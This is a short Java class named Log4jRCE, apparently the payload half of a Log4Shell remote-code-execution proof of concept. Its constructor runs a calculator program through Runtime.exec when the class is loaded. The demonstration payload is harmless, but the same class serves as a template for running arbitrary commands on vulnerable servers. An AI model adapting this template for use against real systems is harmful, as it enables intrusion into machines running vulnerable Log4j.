import java.io.IOException;

public class Log4jRCE {
    public Log4jRCE() {
        try {
            Runtime.getRuntime().exec("deepin-calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
